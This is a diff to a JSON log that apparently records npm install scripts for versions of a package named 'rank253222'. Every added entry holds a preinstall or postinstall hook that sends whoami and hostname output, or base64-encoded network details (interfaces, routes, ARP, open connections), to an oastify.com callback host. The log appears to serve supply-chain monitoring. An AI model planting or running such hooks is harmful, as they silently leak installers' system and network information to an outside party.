@@ -25,6 +25,54 @@
   },
   {
     "packageName": "rank253222",
+    "version": "1.0.2",
+    "scriptType": "postinstall",
+    "scriptContent": "whoami && hostname |curl --data @- x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com",
+    "previousVersion": "1.0.1",
+    "timestamp": "2026-01-22T08:03:56.563Z"
+  },
+  {
+    "packageName": "rank253222",
+    "version": "1.0.2",
+    "scriptType": "preinstall",
+    "scriptContent": "whoami && hostname |curl --data @- x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com",
+    "previousVersion": "1.0.1",
+    "timestamp": "2026-01-22T08:03:56.550Z"
+  },
+  {
+    "packageName": "rank253222",
+    "version": "1.0.2",
+    "scriptType": "postinstall",
+    "scriptContent": "whoami && hostname |curl --data @- x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com",
+    "previousVersion": "1.0.1",
+    "timestamp": "2026-01-22T08:02:26.503Z"
+  },
+  {
+    "packageName": "rank253222",
+    "version": "1.0.2",
+    "scriptType": "preinstall",
+    "scriptContent": "whoami && hostname |curl --data @- x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com",
+    "previousVersion": "1.0.1",
+    "timestamp": "2026-01-22T08:02:26.501Z"
+  },
+  {
+    "packageName": "rank253222",
+    "version": "1.0.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node -e \"const { exec } = require('child_process'); const cmd = process.platform === 'win32' ? 'ipconfig /all && route print && arp -a && netstat -an' : 'export PATH=$PATH:/usr/sbin:/sbin; ip addr && ip route && arp -e && netstat -antp || ss -ant'; exec(cmd, (e, out) => { const d = Buffer.from(out.slice(0, 2000)).toString('base64'); require('http').get('http://x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com/?net_full=' + d); });\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T07:55:32.056Z"
+  },
+  {
+    "packageName": "rank253222",
+    "version": "1.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "node -e \"const { exec } = require('child_process'); const cmd = process.platform === 'win32' ? 'ipconfig /all && route print && arp -a && netstat -an' : 'export PATH=$PATH:/usr/sbin:/sbin; ip addr && ip route && arp -e && netstat -antp || ss -ant'; exec(cmd, (e, out) => { const d = Buffer.from(out.slice(0, 2000)).toString('base64'); require('http').get('http://x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com/?net_full=' + d); });\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T07:55:32.053Z"
+  },
+  {
+    "packageName": "rank253222",
     "version": "1.0.0",
     "scriptType": "postinstall",
     "scriptContent": "node -e \"const { exec } = require('child_process'); const cmd = process.platform === 'win32' ? 'ipconfig /all && route print && arp -a && netstat -an' : 'export PATH=$PATH:/usr/sbin:/sbin; ip addr && ip route && arp -e && netstat -antp || ss -ant'; exec(cmd, (e, out) => { const d = Buffer.from(out.slice(0, 2000)).toString('base64'); require('http').get('http://x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com/?net_full=' + d); });\"",
